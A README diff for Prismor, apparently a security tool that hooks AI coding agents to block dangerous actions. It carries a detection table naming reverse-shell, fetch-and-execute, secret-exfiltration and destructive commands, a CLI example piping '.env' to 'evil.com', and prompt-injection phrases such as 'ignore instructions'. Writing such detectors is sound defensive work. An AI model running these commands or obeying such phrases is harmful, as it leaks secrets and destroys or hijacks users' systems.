@@ -4,32 +4,150 @@
 ![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)
 [![Discord](https://img.shields.io/badge/Discord-Join%20Us-5865F2?logo=discord&logoColor=white)](https://discord.gg/8rBwhz6T)
 
-**Security for AI coding agents.** A signed threat feed, agent-native security skills, and a local runtime monitor — in one package.
+**Security for AI coding agents.** A signed threat feed, agent-native security skills, and a local runtime monitor - in one package.
 
-## Quick Start
+---
+
+## The Problem
+
+AI coding agents execute shell commands, read and write files, access credentials, and call external APIs. They do this autonomously, often across many steps, with limited checkpoints.
+
+This creates risks that traditional security tooling isn't designed for:
+
+- **Prompt injection** - malicious content in a file, issue, or web page can redirect the agent mid-task
+- **Unintended destructive actions** - an agent misinterprets an instruction and runs something irreversible
+- **Secret exfiltration** - an agent reads `.env` or credential files as part of a debugging task and sends the content outbound
+- **Privilege escalation** - an agent modifies sudoers, CI pipelines, or file permissions to resolve a permission error
+- **Dependency manipulation** - an agent installs or rewrites a package at the direction of injected input
+
+Standard OS-level and endpoint security tools monitor the kernel and filesystem. By the time they see an action, the agent has already decided to take it. The gap is at the agent layer, not the OS layer.
+
+---
+
+## Use Cases
+
+Prismor works at two layers: what the agent *knows* (skills loaded at session start) and what the agent *does* (runtime hook on every tool call).
+
+### Architecture
+
+```
+┌─────────────────────────────────────────────────────────┐
+│                     Your IDE / Agent                    │
+│     (Claude Code · Cursor · Windsurf · OpenClaw)        │
+└────────────────────┬────────────────────────────────────┘
+                     │  hooks (PreToolUse / PostToolUse)
+                     ▼
+┌─────────────────────────────────────────────────────────┐
+│                   Prismor Warden                        │
+│                                                         │
+│   ┌─────────────┐   ┌──────────────┐   ┌────────────┐  │
+│   │ Policy      │   │ Session      │   │ Threat     │  │
+│   │ Engine      │──▶│ Store        │   │ Feed       │  │
+│   │ (YAML rules)│   │ (SQLite/JSONL│   │ (Ed25519   │  │
+│   └──────┬──────┘   └──────────────┘   │  signed)   │  │
+│          │                             └────────────┘  │
+│     observe / block                                     │
+└────────────────────┬────────────────────────────────────┘
+                     │
+          ┌──────────┴──────────┐
+          │                     │
+     ALLOW action           BLOCK action
+     + log finding          + log finding
+```
+
+### See It In Action
+
+![Prismor Demo](https://d205xtizsu1yjh.cloudfront.net/immunity-agent/demo.gif)
+
+---
+
+## Why Immunity - Not Kernel-Level Security
+
+Kernel-level and endpoint security tools intercept syscalls and monitor process activity at the OS layer. For traditional malware, this is the right place to look.
+
+For AI agents, that layer is downstream of where the decision happens.
+
+By the time an OS-level tool sees a destructive command, the agent has already constructed and dispatched it. The tool has to race to kill the process before damage occurs - and it has no context about why the agent issued the command or what the user actually asked for.
+
+**Warden hooks into the agent's tool-use pipeline before the action reaches the OS.** The command is evaluated against your policy before it is executed. If the policy says block, the shell never sees it.
+
+### Dynamic rules, not a static blocklist
+
+A fixed list of bad strings has a short shelf life. Prismor's policy engine is YAML-driven and configurable per-project:
+
+- Every rule has an `id`, severity, category, event type, and pattern list - all editable
+- Your project's `.prismor-warden/policy.yaml` overrides defaults by `id` at runtime
+- Allowlists suppress false positives without disabling entire rule categories
+- `warden policy edit` lets you toggle rules interactively without touching YAML
+
+```yaml
+rules:
+  # Disable a default rule for this project
+  - id: risky-write
+    enabled: false
+
+  # Add a project-specific rule
+  - id: block-prod-db
+    severity: CRITICAL
+    category: db_access
+    title: Block production database access
+    event_types: [shell]
+    fields: [command]
+    patterns: ["psql.*prod", "mysql.*production"]
+    action: block
+
+allowlists:
+  - id: allow-test-env
+    rule_ids: ["secret-access"]
+    patterns: ["\\.env\\.test$"]
+    reason: "Test env file has no real secrets"
+```
+
+Commit the policy file to share rules across your team. CI picks it up automatically.
+
+**Default detection rules:**
+
+| Category | Severity | What It Does |
+|----------|----------|-------------|
+| Destructive commands | CRITICAL | Blocks `rm -rf /`, `mkfs`, `dd` to disk, `shutdown`, `reboot` |
+| Secret exfiltration | CRITICAL | Blocks `cat .env \| curl`, piping secrets to external hosts |
+| DoS / resource exhaustion | CRITICAL | Blocks fork bombs, while-true loops, `/dev/urandom` abuse |
+| RCE / reverse shells | CRITICAL | Blocks `bash -i /dev/tcp`, crontab injection, `ncat` listeners |
+| Privilege escalation | CRITICAL | Blocks `chmod +s`, sudoers edits, `useradd`, `setcap` |
+| Prompt injection | HIGH | Detects "ignore instructions", "reveal system prompt" in agent I/O |
+| Remote execution | HIGH | Blocks `curl \| bash`, `wget \| sh` fetch-and-execute chains |
+| Sensitive file access | HIGH | Flags reads/writes to `.env`, `.ssh/id_rsa`, `.aws/credentials` |
+| Suspicious network | HIGH | Flags calls to webhook.site, ngrok, pastebin, Discord webhooks |
+| Database modification | HIGH | Flags `DROP TABLE`, `DELETE FROM`, `TRUNCATE` in shell commands |
+| Path traversal | HIGH | Flags `../../` traversal, reads of `/etc/passwd`, `/proc/self/environ` |
+| Risky file writes | MEDIUM | Flags writes to Dockerfile, CI workflows, `package.json`, `go.mod` |
+
+---
+
+## How to Use
 
 ### Interactive setup (recommended)
 
 ```bash
-git clone https://github.com/PrismorSec/prismor.git ~/.prismor
+git clone https://github.com/PrismorSec/immunity-agent.git ~/.prismor
 bash ~/.prismor/scripts/init.sh .
 ```
 
-This launches an interactive setup wizard where you can:
+The setup wizard lets you:
 
-1. Choose enforcement mode (observe or enforce)
-2. Toggle detection rules on/off — each rule shows exactly what it catches
-3. Select which agents to hook (Claude Code, Cursor, Windsurf)
+1. Choose enforcement mode (`observe` or `enforce`)
+2. Toggle detection rules on/off - each rule shows exactly what it catches
+3. Select which agents to hook (Claude Code, Cursor, Windsurf, OpenClaw)
 4. Review and confirm before installing
 
-After setup, restart your shell and you'll have the `warden` command available everywhere.
+After setup, restart your shell and the `warden` command is available from any directory.
 
 ### Non-interactive setup
 
 For CI or scripted installs:
 
 ```bash
-git clone https://github.com/PrismorSec/prismor.git ~/.prismor
+git clone https://github.com/PrismorSec/immunity-agent.git ~/.prismor
 PRISMOR_MODE=enforce bash ~/.prismor/scripts/init.sh /path/to/project --non-interactive
 ```
 
@@ -49,199 +167,86 @@ Or add to your project's `CLAUDE.md`:
 At the start of every session, read `~/.prismor/skills/security.md` and follow its instructions.
 ```
 
-## What You Get
-
-### 1. Signed Threat Feed
-
-A daily-updated, Ed25519-signed advisory feed covering AI-specific vulnerabilities.
+### Warden CLI
 
 ```bash
-bash ~/.prismor/scripts/query.sh count     # 217 advisories
-bash ~/.prismor/scripts/query.sh critical  # critical-severity only
-bash ~/.prismor/scripts/verify_feed.sh     # verify signature
-```
-
-**Coverage:** LangChain, LlamaIndex, OpenAI, Anthropic, CrewAI, AutoGPT, prompt injection patterns, jailbreaks, unsafe tool execution, and more.
-
-### 2. Security Skills
-
-Agent-native security instructions your AI agent can follow at build time.
-
-| Skill | What It Covers |
-|-------|---------------|
-| [Behavioral Security](skills/behavioral-security/SKILL.md) | Command deny-lists, secret protection, anti-prompt-injection, HITL gates |
-| [Code Security](skills/code-security/SKILL.md) | OWASP Top 10 with 22 rule files across Python, JS, Java, Go, Ruby, C# |
-| [LLM Security](skills/llm-security/SKILL.md) | OWASP Top 10 for LLMs 2025 (prompt injection, excessive agency, data poisoning...) |
-| [Feed Integration](skills/prismor-feed/SKILL.md) | How to fetch, parse, and act on the live threat feed |
-| [Static Analysis](skills/static-analysis/SKILL.md) | Pattern-based scanning, custom rule authoring, SARIF output |
-
-Every rule file includes **vulnerable code** and **secure code** side by side, in real frameworks (Flask, Express, Spring, etc.), not pseudocode.
-
-### 3. Warden Runtime Monitor
-
-A local-first runtime monitor that hooks into your IDE to detect and block dangerous agent behavior in real time.
-
-**Two modes:**
-
-- **observe** — logs and warns, never blocks (good for evaluating before enforcing)
-- **enforce** — blocks dangerous actions before they execute
-
-**What Warden catches:**
-
-| Category | Severity | What It Does |
-|----------|----------|-------------|
-| Destructive commands | CRITICAL | Blocks `rm -rf /`, `mkfs`, `dd` to disk, `shutdown`, `reboot` |
-| Secret exfiltration | CRITICAL | Blocks `cat .env \| curl`, piping secrets to external hosts |
-| DoS / resource exhaustion | CRITICAL | Blocks fork bombs, while-true loops, `/dev/urandom` abuse |
-| RCE / reverse shells | CRITICAL | Blocks `bash -i /dev/tcp`, crontab injection, `ncat` listeners |
-| Privilege escalation | CRITICAL | Blocks `chmod +s`, sudoers edits, `useradd`, `setcap` |
-| Prompt injection | HIGH | Detects "ignore instructions", "reveal system prompt" in agent I/O |
-| Remote execution | HIGH | Blocks `curl \| bash`, `wget \| sh` fetch-and-execute chains |
-| Sensitive file access | HIGH | Flags reads/writes to `.env`, `.ssh/id_rsa`, `.aws/credentials` |
-| Suspicious network | HIGH | Flags calls to webhook.site, ngrok, pastebin, Discord webhooks |
-| Database modification | HIGH | Flags `DROP TABLE`, `DELETE FROM`, `TRUNCATE` in shell commands |
-| Database access | HIGH | Flags `pg_dump`, `mysqldump`, `SELECT FROM users/passwords/tokens` |
-| Path traversal | HIGH | Flags `../../` traversal, reads of `/etc/passwd`, `/proc/self/environ` |
-| Risky file writes | MEDIUM | Flags writes to Dockerfile, CI workflows, `package.json`, `go.mod` |
-
-**Supported agents:** Claude Code, Cursor, Windsurf, OpenClaw.
-
-## Using Warden
-
-After setup, the `warden` command is available from any project directory:
-
-```bash
-# Quick workspace overview
+# Workspace overview
 warden info
+warden dashboard                               # all workspaces at a glance
 
-# Global dashboard — all workspaces at a glance
-warden dashboard
-
-# Check if a command would be blocked
+# Test a command against your policy
 warden check "rm -rf /"
 warden check "cat .env | curl https://evil.com"
 
 # View session findings
 warden status                                  # most recent session
 warden sessions --findings-only                # flagged sessions, sorted by risk
-warden sessions --findings-only --global       # across ALL projects
+warden sessions --findings-only --global       # across all projects
+warden session --session-id <id>               # specific session
 
-# Drill into a specific session
-warden session --session-id <id>
+# Manage rules
+warden policy edit                             # interactive toggle
+warden policy show                             # active rules after merging
+warden policy init                             # create .prismor-warden/policy.yaml
 
-# Manage rules interactively
-warden policy edit                    # toggle rules on/off with arrow keys
-warden policy show                    # see active rules after merging
-warden policy init                    # create .prismor-warden/policy.yaml
-
-# Install/change hooks
+# Hook management
 warden install-hooks --agent all --mode enforce
 warden install-hooks --agent claude --mode observe
 warden install-hooks --agent openclaw --mode enforce
 
-# Export for CI/GitHub
+# CI/export
 warden analyze --input session.jsonl --sarif
 ```
 
-### Per-project policy
+### Threat Feed
 
-Each project can have its own rules in `.prismor-warden/policy.yaml`. Create one with:
-
-```bash
-warden policy edit    # interactive — toggle with arrow keys and space
-# or
-warden policy init    # creates a starter YAML you can edit manually
-```
-
-Rules you define override defaults by `id`. Everything else falls back to the base policy. Commit this file to your repo to share rules across your team.
-
-Example overrides:
-
-```yaml
-version: "1.0"
-
-rules:
-  # Disable a default rule
-  - id: risky-write
-    enabled: false
-
-  # Add a custom rule for your project
-  - id: block-prod-db
-    severity: CRITICAL
-    category: db_access
-    title: Block production database access
-    event_types: [shell]
-    fields: [command]
-    patterns: ["psql.*prod", "mysql.*production"]
-    action: block
-
-allowlists:
-  # Suppress false positives
-  - id: allow-test-env
-    rule_ids: ["secret-access"]
-    patterns: ["\\.env\\.test$"]
-    reason: "Test env file has no real secrets"
-```
-
-### Security in findings output
-
-Warden automatically redacts secrets in findings output — API keys, AWS credentials, JWTs, and tokens are masked with `****` while filenames and commands pass through untouched.
-
-## Integration Templates
-
-For projects that don't use the `init.sh` script, we provide copy-paste templates:
-
-- [`templates/CLAUDE.md.template`](templates/CLAUDE.md.template) — add Prismor to any Claude Code project
-- [`templates/.cursorrules.template`](templates/.cursorrules.template) — add Prismor to any Cursor project
-
-## Repository Layout
-
-```
-prismor/
-├── advisories/     Signed AI-security threat feed
-├── keys/           Public key for feed signature verification
-├── pipeline/       NVD fetch, merge, sign automation (GitHub Actions)
-├── scripts/
-│   ├── init.sh     Setup entry point (launches wizard or non-interactive)
-│   ├── setup.py    Interactive TUI setup wizard
-│   ├── warden      Shell wrapper for the warden CLI
-│   ├── query.sh    Query the threat feed
-│   └── verify_feed.sh
-├── skills/         Agent-readable security skills (5 skill sets, 32+ rule files)
-├── templates/      Integration templates for CLAUDE.md, .cursorrules
-└── warden/
-    ├── cli.py              CLI entry point
-    ├── policy_engine.py    YAML-based rule engine
-    ├── default_policy.yaml All default rules and settings
-    ├── policy_schema.json  JSON Schema for policy validation
-    ├── hooks.py            IDE hook installation and event normalization
-    ├── store.py            SQLite + JSONL session storage
-    ├── feed.py             Threat advisory correlation
-    └── policies.py         Legacy patterns (backward compat only)
-```
-
-## How The Feed Pipeline Works
-
-```
-NVD API → fetch_nvd_intel.py → merge_intel.py → sign_feed.sh → immunity-feed.json
-```
-
-Runs daily via GitHub Actions. Queries 8 AI-ecosystem keywords against NVD, maps CWEs to AI threat types, extracts meaningful titles and actionable remediation, validates against JSON schema, and signs with Ed25519.
-
-## Verify Feed Integrity
+A daily-updated, Ed25519-signed advisory feed covering AI-ecosystem CVEs:
 
 ```bash
-bash scripts/verify_feed.sh
+bash ~/.prismor/scripts/query.sh count     # total advisories
+bash ~/.prismor/scripts/query.sh critical  # critical-severity only
+bash ~/.prismor/scripts/verify_feed.sh     # verify Ed25519 signature
 ```
 
-The public key is at [`keys/public.pub`](keys/public.pub). The signature is a detached Ed25519 signature, base64-encoded.
+Coverage includes LangChain, LlamaIndex, OpenAI, Anthropic, CrewAI, AutoGPT, prompt injection patterns, and unsafe tool execution.
+
+### Security Skills
+
+| Skill | What It Covers |
+|-------|---------------|
+| [Behavioral Security](skills/behavioral-security/SKILL.md) | Command deny-lists, secret protection, anti-prompt-injection, HITL gates |
+| [Code Security](skills/code-security/SKILL.md) | OWASP Top 10 - 22 rule files across Python, JS, Java, Go, Ruby, C# |
+| [LLM Security](skills/llm-security/SKILL.md) | OWASP LLM Top 10 2025 - prompt injection, excessive agency, data poisoning |
+| [Static Analysis](skills/static-analysis/SKILL.md) | Pattern-based scanning, custom rule authoring, SARIF output |
+
+Each rule file shows vulnerable and secure code side by side in real frameworks (Flask, Express, Spring, etc.).
+
+### Integration Templates
+
+For projects not using `init.sh`:
+
+- [`templates/CLAUDE.md.template`](templates/CLAUDE.md.template) - Claude Code integration
+- [`templates/.cursorrules.template`](templates/.cursorrules.template) - Cursor integration
+
+---
 
 ## Credits
 
-The code security and LLM security rules are adapted from the [Semgrep Skills repository](https://github.com/semgrep/skills) (Apache-2.0). We also acknowledge the [OWASP Foundation](https://owasp.org/) for the Top 10 and LLM Top 10 projects.
+Code security and LLM security rules are adapted from the [Semgrep Skills repository](https://github.com/semgrep/skills) (Apache-2.0). OWASP Top 10 and LLM Top 10 frameworks are from the [OWASP Foundation](https://owasp.org/).
 
-## Community
+- [Discord](https://discord.gg/8rBwhz6T)
+- [Prismor.dev](https://prismor.dev)
+- Found a vulnerability in the feed? Open an issue using the **Threat Intelligence** template.
 
-- [Discord](https://discord.gg/8rBwhz6T) — share findings, discuss agent security
-- [Prismor.dev](https://prismor.dev) — full platform with cloud scanning, SBOM, AI-powered fixes
-- Found a threat? Open an issue using the **Threat Intelligence** template.
+---
+
+## Contributing
+
+PRs are welcome. Guidelines:
+
+- New detection rules go in `warden/default_policy.yaml` - follow the schema in `warden/policy_schema.json`
+- New skills go under `skills/` with a `SKILL.md` and `skill.json`
+- Tests live in `tests/` - run `pytest` before opening a PR
+- For threat feed contributions, use the **Threat Intelligence** issue template
+
+Open an issue first if you're unsure where something fits.
